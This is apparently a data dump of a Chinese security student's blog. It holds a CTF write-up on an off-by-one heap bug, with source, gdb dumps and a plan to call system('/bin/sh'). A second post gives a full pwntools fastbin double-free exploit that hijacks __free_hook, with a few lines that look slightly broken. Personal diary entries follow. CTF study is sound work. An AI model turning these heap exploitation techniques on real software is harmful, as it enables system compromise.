class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Size of Heap : &quot;</span>);</span><br><span class=\"line\">\t\t\tread(<span class=\"number\">0</span>,buf,<span class=\"number\">8</span>);</span><br><span class=\"line\">\t\t\tsize = atoi(buf);</span><br><span class=\"line\">\t\t\theaparray[i]-&gt;content = (<span class=\"keyword\">char</span> *)<span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(!heaparray[i]-&gt;content)&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Allocate Error&quot;</span>);</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">2</span>);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\theaparray[i]-&gt;size = size ;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content of heap:&quot;</span>);</span><br><span class=\"line\">\t\t\tread_input(heaparray[i]-&gt;content,size);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;SuccessFul&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span> ;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>创建新堆。</p>\n<p>初始化定义一些缓冲区。</p>\n<p>关于这个</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span>(i = <span class=\"number\">0</span> ; i &lt; <span class=\"number\">10</span> ; i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!heaparray[i])&#123;</span><br><span class=\"line\">\t\t\theaparray[i] = (struct heap *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(struct heap));</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(!heaparray[i])&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Allocate Error&quot;</span>);</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br></pre></td></tr></table></figure>\n\n<p>之前一直不是很懂，但是好好看了一下逻辑其实也不难。</p>\n<p>heaparray就是一个数组，应该要储存相应数据的地址（指针），</p>\n<p>我们malloc的时候如果malloc成功的话这个数组会被赋值为被分配内存的地址，但是如果分配失败的话数组就还是数组本身，所以会有下一个if判断，如果还是本身便打印malloc失败。</p>\n<p>也就是说这应该是一个初始化的过程，我们需要将heap结构赋值。</p>\n<p>先留着，下一段需要我们设置heap的size。程序为我们分配了8字节的空间来储存这个size的值，然后就是比较关键的内容了。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">heaparray[i]-&gt;content = (<span class=\"keyword\">char</span> *)<span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(!heaparray[i]-&gt;content)&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Allocate Error&quot;</span>);</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">2</span>);</span><br><span class=\"line\">\t\t\t&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>这里涉及到一个新的操作符<code>-&gt;</code>.</p>\n<blockquote>\n<p>“-&gt;”是一个整体，它是用于指向结构体子数据的指针，用来取子数据。</p>\n<p>换种说法，如果我们在C语言中定义了一个结构体，然后申明一个指针指向这个结构体，那么我们要用指针取出结构体中的数据，就要用到“-&gt;”</p>\n</blockquote>\n<p>在这个程序里，因为content是结构体heap中的一个被定义的子数据，所以当我们要使用它的时候，我们需要用这个操作符来取出它。具体来说就是取出结构体heap中的子结构content，然后把<code>(char *)malloc(size)</code>赋值给它。</p>\n<p>当然，如果下一步操作打发现并不是<code>heaparray[i]-&gt;content</code>的话就打印allocate失败。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">heaparray[i]-&gt;size = size ;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content of heap:&quot;</span>);</span><br><span class=\"line\">\t\t\tread_input(heaparray[i]-&gt;content,size);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;SuccessFul&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span> </span><br></pre></td></tr></table></figure>\n\n<p>我们先给size赋值。这里应该和前面的代码是一个代码段。。</p>\n<p>然后是输入content。这里就是我们的漏洞点，我们把结构体中点content取出并用myread给它赋值。</p>\n<p>话说这里为什么没有失败的报错提醒呢，可能是为了防止无法利用漏洞？</p>\n<p>之前还有一个疑问就是heap初始化处为什么需要for循环，看完以后发现是我太局限于这一个代码块并且忽视了结尾处的break，这个for循环其实是针对于整个add函数的，我们总共只能分配十个堆结构，这个for正好就是控制我们在需要的时候分配的。。。。</p>\n<p>add函数看完以后我们来研究下一个函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">edit_heap</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> idx ;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> buf[<span class=\"number\">4</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index :&quot;</span>);</span><br><span class=\"line\">\tread(<span class=\"number\">0</span>,buf,<span class=\"number\">4</span>);</span><br><span class=\"line\">\tidx = atoi(buf);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(idx &lt; <span class=\"number\">0</span> || idx &gt;= <span class=\"number\">10</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Out of bound!&quot;</span>);</span><br><span class=\"line\">\t\t_exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(heaparray[idx])&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content of heap : &quot;</span>);</span><br><span class=\"line\">\t\tread_input(heaparray[idx]-&gt;content,heaparray[idx]-&gt;size+<span class=\"number\">1</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Done !&quot;</span>);</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;No such heap !&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>编辑</p>\n<p>分析完add函数以后再看就感觉信手拈来了。</p>\n<p>首先创建一个4byte的buf来储存我们的idx，<code>idx = atoi(buf);</code>这个操作之前没有说到，大概是将buf的大小转变为一个int类型的数。</p>\n<p>应该不是考点，但是值得关注。</p>\n<p>然后接着一个普通的范围限定，接下来就是输入idx然后修改heap的content。没什么好说的。</p>\n<p>这个<code>if(heaparray[idx])</code>，它不是逻辑运算语句，所以只要括号里不是什么奇怪的东西一般就能成立。</p>\n<p>show和edit基本异曲同工，这里直接省略。</p>\n<p>看delete。</p>\n<p>堆题最需要关注的感觉还是增和删。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">delete_heap</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> idx ;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> buf[<span class=\"number\">4</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index :&quot;</span>);</span><br><span class=\"line\">\tread(<span class=\"number\">0</span>,buf,<span class=\"number\">4</span>);</span><br><span class=\"line\">\tidx = atoi(buf);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(idx &lt; <span class=\"number\">0</span> || idx &gt;= <span class=\"number\">10</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Out of bound!&quot;</span>);</span><br><span class=\"line\">\t\t_exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(heaparray[idx])&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">free</span>(heaparray[idx]-&gt;content);</span><br><span class=\"line\">\t\t<span class=\"built_in\">free</span>(heaparray[idx]);</span><br><span class=\"line\">\t\theaparray[idx] = <span class=\"literal\">NULL</span> ;</span><br><span class=\"line\">\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Done !&quot;</span>);\t</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;No such heap !&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>还是先储存idx，以及范围限定。</p>\n<p>然后这里是调用free函数，把content以及整个指向heap的指针都free了，并且还将指针置null。</p>\n<p>至此比较关键的一些函数都看完了。main函数里值的注意的就是开头的setbuf。</p>\n<p>虽然做题的时候知道这个东西不是考点，也没啥存在感，但是如果要写程序的话掌握还是必要的。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">setvbuf</span><span class=\"params\">(FILE *stream, <span class=\"keyword\">char</span> *buffer, <span class=\"keyword\">int</span> mode, <span class=\"keyword\">size_t</span> size)</span></span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>四个参数，流，buf指针，模式，大小</p>\n<blockquote>\n<ul>\n<li><strong>参数</strong><br>stream** – 这是指向 FILE 对象的指针，该 FILE 对象标识了一个打开的流。</li>\n<li><strong>buffer</strong> – 这是分配给用户的缓冲。如果设置为 NULL，该函数会自动分配一个指定大小的缓冲。</li>\n<li><strong>mode</strong> – 这指定了文件缓冲的模式：</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th align=\"left\">模式</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">_IOFBF</td>\n<td align=\"left\"><strong>全缓冲</strong>：对于输出，数据在缓冲填满时被一次性写入。对于输入，缓冲会在请求输入且缓冲为空时被填充。</td>\n</tr>\n<tr>\n<td align=\"left\">_IOLBF</td>\n<td align=\"left\"><strong>行缓冲</strong>：对于输出，数据在遇到换行符或者在缓冲填满时被写入，具体视情况而定。对于输入，缓冲会在请求输入且缓冲为空时被填充，直到遇到下一个换行符。</td>\n</tr>\n<tr>\n<td align=\"left\">_IONBF</td>\n<td align=\"left\"><strong>无缓冲</strong>：不使用缓冲。每个 I/O 操作都被即时写入。buffer 和 size 参数被忽略。</td>\n</tr>\n</tbody></table>\n<ul>\n<li><strong>size</strong> –这是缓冲的大小，以字节为单位</li>\n</ul>\n</blockquote>\n<p>但是还是不清楚调用这个函数的意义在哪里。</p>\n<p>查了一下好像是可以加快访问速度。。因为一般做题的时候遇到的setbuf的mode都是0，应该是无缓冲吧，然后对应不使用缓冲。每个 I/O 操作都被即时写入。。。还真的是为了加快速度？</p>\n<p>还有就是switch操作的时候并没有使用for循坏来控制case的值，而是read加atoi的操作，也是为了性能吗？</p>\n<p>贴一下学委的解答，setbuf是为了取消缓冲区，而防止各种奇怪的bug。</p>\n<p>然后来看这道题的漏洞利用。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content of heap:&quot;</span>);</span><br><span class=\"line\">     read_input(*((_QWORD *)*(&amp;heaparray + i) + <span class=\"number\">1</span>), size);</span><br><span class=\"line\">     <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;SuccessFul&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>可以看到输入的时候是多输入了一个字节的，这就造成了（非常刻意）的off by one。</p>\n<p>我们创建两个chunk来验证这个漏洞</p>\n<p>![image-20210605154056881](/Users/rin/Library/Application Support/typora-user-images/image-20210605154056881.png)</p>\n<p>如图，</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">x603290:\t0x0000000000000000\t0x0000000000000021</span><br><span class=\"line\">0x6032a0:\t0x0000000000000004\t0x00000000006032c0<span class=\"comment\">#chunk0 size</span></span><br><span class=\"line\">0x6032b0:\t0x0000000000000000\t0x0000000000000021</span><br><span class=\"line\">0x6032c0:\t0x0000000061616161\t0x0000000000000000<span class=\"comment\">#chunk0 content1</span></span><br><span class=\"line\">0x6032d0:\t0x0000000000000000\t0x0000000000000021</span><br><span class=\"line\">0x6032e0:\t0x0000000000000004\t0x0000000000603300<span class=\"comment\">#chunk2 size</span></span><br><span class=\"line\">0x6032f0:\t0x0000000000000000\t0x0000000000000021</span><br><span class=\"line\">0x603300:\t0x0000000062626262\t0x0000000000000000<span class=\"comment\">#chunk2 content</span></span><br><span class=\"line\">0x603310:\t0x0000000000000000\t0x0000000000020cf1</span><br><span class=\"line\">0x603320:\t0x0000000000000000\t0x0000000000000000<span class=\"comment\">#top chunk</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>当我们尝试修改chunk0的话又会出现什么呢。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">0x145e290:\t0x0000000000000000\t0x0000000000000021<span class=\"comment\">#chunk0 size</span></span><br><span class=\"line\">0x145e2a0:\t0x0000000000000018\t0x000000000145e2c0</span><br><span class=\"line\">0x145e2b0:\t0x0000000000000000\t0x0000000000000021<span class=\"comment\">#chunk0 content</span></span><br><span class=\"line\">0x145e2c0:\t0x6161616161616161\t0x6161616161616161</span><br><span class=\"line\">0x145e2d0:\t0x6161616161616161\t0x0000000000000041<span class=\"comment\">#repaired chunk1 size</span></span><br><span class=\"line\">0x145e2e0:\t0x0000000000000010\t0x000000000145e300</span><br><span class=\"line\">0x145e2f0:\t0x0000000000000000\t0x0000000000000021<span class=\"comment\">#chunk1 content</span></span><br><span class=\"line\">0x145e300:\t0x0000000a62626262\t0x0000000000000000</span><br><span class=\"line\">0x145e310:\t0x0000000000000000\t0x0000000000000021<span class=\"comment\">#chunk2 size</span></span><br><span class=\"line\">0x145e320:\t0x0000000000000010\t0x000000000145e340</span><br><span class=\"line\">0x145e330:\t0x0000000000000000\t0x0000000000000021<span class=\"comment\">#chunk2 content</span></span><br><span class=\"line\">0x145e340:\t0x0000000a63636363\t0x0000000000000000</span><br></pre></td></tr></table></figure>\n\n<p>可以看到我们申请了三个堆块，原本chunk1的size的size位应该是0x21，而且presize位应该是空，但是由于我们修改chunk0的content的时候输入了0x18个a之后还输入了0x41，而正是由于输入时多比缓冲区多出来了一个字节，导致字节溢出到了下一个chunk，也就是chunk1的presize位。</p>\n<blockquote>\n<p>这里巩固一个人尽皆知的知识点</p>\n<ul>\n<li><strong>prev_size</strong>, 如果该 chunk 的<strong>物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）</strong>是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。<strong>这里的前一 chunk 指的是较低地址的 chunk</strong> </li>\n</ul>\n</blockquote>\n<p>放在这道题就是我们单字节溢出到了chunk1的prevsize位，但是由于此时chunk0是allocated状态，所以并没有太大的影响，但是当我们释放掉chunk0，也就是当我们溢出了一个字节到presize位，并且将上一个chunk（chunk0）free了以后，我们的chunk1的大小就会变为我们设置的溢出的字节的数。</p>\n<p>这里我们选择溢出数是0x41.</p>\n<p>所以结果就如刚才gdb里面所显示的，我们的chunk1的size变成了0x41.</p>\n<p>但是变成0x41又有什么用呢？我们改怎么利用它呢/</p>\n<p>一个最直观的用处就是我们可以通过修改chunk1的内容来加入一些我们想要的东西。</p>\n<p>虽然经过off by one漏洞的利用后我们的chunk1的size是0x41，但是实际上在内存里chunk2的指针并不是向下顺移了0x20，而是还在原地。所以当我们修改chunk1的内容的时候其实就是修改了chunk2的指针。</p>\n<p>那么修改chunk2指针有啥用呢。</p>\n<p>当我们show一个chunk的时候是不是能够显示出这个chunk的content？</p>\n<p>因为这个程序没有给后门，所以我们需要手动泄露出libc。所以我们需要先泄露某个函数的真实地址。那么我们完全可以通过先把某个函数的got表写进去再show出来。</p>\n<p>show出来后我们就能计算函数system的真实地址，并且再次将chunk1的指针修改成system函数。</p>\n<p>修改以后当我们free chunk0，相当于chunk0的内容是函数参数，然后因为指针已经指向system，所以直接调用system（‘/bin/sh’）</p>\n<p>到这里就能够解释之前的0x41</p>\n<p>0x41其实就是为了让编辑chunk0的内容可以直接覆盖掉chunk1的指针，其实把数弄得更大也行，只不过没什么意义了。</p>\n<p>exp懒得写了</p>\n","categories":["HEAP - Off By One"],"tags":["heap"]},{"title":"Message","url":"/2021/05/24/message/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-tqrXcnmm\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<p>第二道fastbin double free。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">free</span>(*(<span class=\"keyword\">void</span> **)&amp;dword_602060[<span class=\"number\">4</span> * v1 + <span class=\"number\">2</span>]);</span><br><span class=\"line\">      dword_602060[<span class=\"number\">4</span> * v1] = <span class=\"number\">0</span>;</span><br><span class=\"line\">      --dword_60204C;</span><br></pre></td></tr></table></figure>\n\n<p>这里没有把指针置为null，所以会产生uaf漏洞。</p>\n<p>ida大体分析了一下就会发现，由于没有后门函数，这道题会比上一道难。而且由于RELRO的开启，got所在的数据段是只读的，这里研究一下relro这个保护。</p>\n<p>uaf漏洞的利用方式有多种，其中就有修改got表达到任意地址写，从而getshel。但是RELRO这个保护，通过将got表所在的地址变成只读，有效阻止了got表覆盖攻击。</p>\n<!--具体可见https://blog.csdn.net/ylcangel/article/details/102625948-->\n\n<p>所以说这道题我们不能用覆盖got表的方式来getshell，而是需要用freehook劫持的方式。</p>\n<p>大体思路是先通过fastbin double free构造fake chunk指向储存chunk的content的地址并泄露puts函数的真实地址，再获得libc基址，借此修改freehook，使它指向system并调用。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = remote(&#x27;124.70.35.238&#x27;,23717)</span></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./message&#x27;</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./message&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">size,content = <span class=\"string\">b&#x27;a&#x27;</span></span>):</span></span><br><span class=\"line\">\tp.sendafter(<span class=\"string\">&#x27;:&#x27;</span>,<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tp.sendafter(<span class=\"string\">&#x27;:&#x27;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\tp.sendafter(<span class=\"string\">&#x27;:&#x27;</span>,content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">\tp.sendafter(<span class=\"string\">&#x27;:&#x27;</span>,<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">\tp.sendafter(<span class=\"string\">&#x27;:&#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span>(<span class=\"params\">idx,content</span>):</span></span><br><span class=\"line\">\tp.sendafter(<span class=\"string\">&#x27;:&#x27;</span>,<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">\tp.sendafter(<span class=\"string\">&#x27;:&#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tp.sendafter(<span class=\"string\">&#x27;:&#x27;</span>,content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">\tp.sendafter(<span class=\"string\">&#x27;:&#x27;</span>,<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">\tp.sendafter(<span class=\"string\">&#x27;:&#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>)<span class=\"comment\">#chunk0,set as the fake chunk</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>)<span class=\"comment\">#chunk1</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>)<span class=\"comment\">#chunk2</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)<span class=\"comment\">#fastbin: chunk1--&gt;chunk2--&gt;chunk1</span></span><br><span class=\"line\"></span><br><span class=\"line\">fake_chunk_addr = <span class=\"number\">0x602060</span> - <span class=\"number\">0x8</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,p64(fake_chunk_addr))<span class=\"comment\">#chunk3--&gt;1</span></span><br><span class=\"line\"><span class=\"comment\">#fastbin: fake_chunk--&gt;chunk1--&gt;chunk2--&gt;chunk1</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>)<span class=\"comment\">#chunk4--&gt;2</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>)<span class=\"comment\">#chunk5--&gt;1</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,p64(elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]))<span class=\"comment\">#chunk6..&gt;fake chunk</span></span><br><span class=\"line\"><span class=\"comment\">#leak the address</span></span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">puts = u64(recv(<span class=\"number\">6</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;puts&#x27;</span>, puts)</span><br><span class=\"line\">libc_base = puts - libc.dump(<span class=\"string\">&#x27;puts&#x27;</span>)</span><br><span class=\"line\">system = libc_base + libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">free_hook = libc_base + libc.dump(<span class=\"string\">&#x27;__free_hook&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">6</span>,p64(free_hook))</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,p64(system))</span><br><span class=\"line\"><span class=\"comment\">#free_hook = system</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x8</span>,<span class=\"string\">&#x27;/bin/shx00&#x27;</span>)</span><br><span class=\"line\">free(<span class=\"number\">7</span>)</span><br><span class=\"line\"><span class=\"comment\">#process system(/bin/sh)</span></span><br></pre></td></tr></table></figure>\n\n\n\n","categories":["HEAP - Fastbin Attack"],"tags":["UAF"]},{"title":"0","url":"/1919/08/10/%E6%B7%B1%E5%A4%9C%E9%AB%98%E9%80%9F-0/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-HwixjTIF\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n\n\n<p>破防了。</p>\n<p>虽然我本身就对这个比赛没有什么过高的期待，但是确实还是非常失望。非常失望。</p>\n<p>可能我之前在buu上面刷的19年的题确实过于简单了，让我产生了“今年也会如此”的感觉。事实上这种不切实际的想法在我比赛前夕刷知乎看去年师傅们对于2020年的比赛的吐槽时就已经有所坍塌，只是当现实确实如此的时候，还是会觉得非常失望。</p>\n<p>现在我的心理压力事实上是不亚于高三时期的。虽然这个事情从侧面反映出我高三也不是绝对认真就是了。高三的时候虽然学习学科知识感到很恶心，但是我还是努力去学了，是考不上心仪大学给我带来的极大的压力。现在倒是没有什么“不做就会死”的压力了，但是我其实明白现在还是很关键的一段时期，我和学校同级学生最好的那一批的起跑线是相当的，只要我足够努力，我就可以超过他们，实际上不管哪个时期都是一种正反馈机制。只不过驱动力是不同的，虽然本质上都是外力。</p>\n<p>但是一场国赛给我整破防了。</p>\n<p>就和看到国际学院学生和计算机通信学院学生的差距一样，我看到了我们学校与所谓强校的差距。</p>\n<p>这是无法跨越的鸿沟。</p>\n<p>前十队伍除了航电成信，清一色985.而我们学校，强如大四的学长，或者学委，都只能靠边站。</p>\n<p>这种差距让我不禁觉得好像只站在这个学校的巅峰并不是一件值得高兴的事情。</p>\n<p>大学越读越让我觉得，大学的环境真的特别重要。一年前我宁愿在南邮读信安，也不愿去北邮读扫地专业。但是现在我宁愿读扫地专业，只要我能上北邮。</p>\n<p>更好的大学，确实意味更多机会。当然你肯定要足够强才能竞争这个机会。</p>\n<p>但是如果全身心投入进去，怎么可能弱？</p>\n<p>但是无妨，冲就完事了。学习环境再好还不是靠网上教程？我这种孤儿也不喜欢问别人什么东西的。</p>\n<p>加油吧。在强网杯之前学好heap漏洞。</p>\n<p>在暑假考核之前学习trick。</p>\n<p>暑假的话用两个月补一下开发和算法。（ps：开学加个移动开发部？？？）</p>\n","categories":["深夜高速"],"tags":["mess"]},{"title":"1","url":"/1919/08/10/%E6%B7%B1%E5%A4%9C%E9%AB%98%E9%80%9F-1/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-xoHVpJVF\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div>     </p>\n<h5 id=\"0\"><a href=\"#0\" class=\"headerlink\" title=\"0:\"></a>0:</h5><p>​        写下这些话的时候，不知不觉地，已经半夜两点了。</p>\n<p>​        其实放在半个月之前的我看来，两点根本不是半夜，而是夜生活的开始。然而仅仅十五天，我将作息强行向前延伸了两小时，所以对于现在的我来说，两点已经是高程度的熬夜了。</p>\n<p>​        熬夜并不是一件坏事，至少我如今也这么认为——只要不是因为玩手机等无意义的事情而浪费生命。</p>\n<p>​        最近的我一直在经受苦难，或者说，我一直认为我在经受别人未曾经受的苦难。这份苦难深沉而难以被他人理解，这份苦难是独属于我的宝藏。</p>\n<p>​        我珍视这样的宝藏——我将它视若使我独立于其他人的，高傲的资本，即使它本质上只是一种普通的苦难。我似乎沉醉于享受苦难了。享受苦难，多么滑稽，但是这是确乎发生的事情。</p>\n<p>​        古往今来，享受苦难的人从来不会获得胜利，英雄从来视苦难为眼前的敌人，即使苦难要伴随他多年，但他必然不会爱上苦难。</p>\n<p>​        正确的思维不会将痛苦的过程当做自我价值的完成，只有虚荣的心才会如此感想。</p>\n<p>​        既然人没有真正喜爱的东西，那只有被人喜爱，才能使他满足，因此人生快意的来源，统统来自他人的赞赏，一旦赞赏减少，甚至消失，他也就消失了，于是他开始自我陶醉，但是又有什么能够陶醉呢？明明一事无成？</p>\n<p>​        一事无成？并不全对，他还有一大把苦难，值得他去品味。</p>\n<p>​        这样的个体，完全由虚荣构成，任何表现出来的，他所喜爱的事情，只不过是让社会接纳他的借口。</p>\n<p>​        当我意识到这一点时，自然而然地会辩解：“那么，是不是所有人其实都没有真正喜欢的事情呢？”</p>\n<p>​        曾经我是坚信这一点的，但是我没有领会其中的微妙。</p>\n<p>​        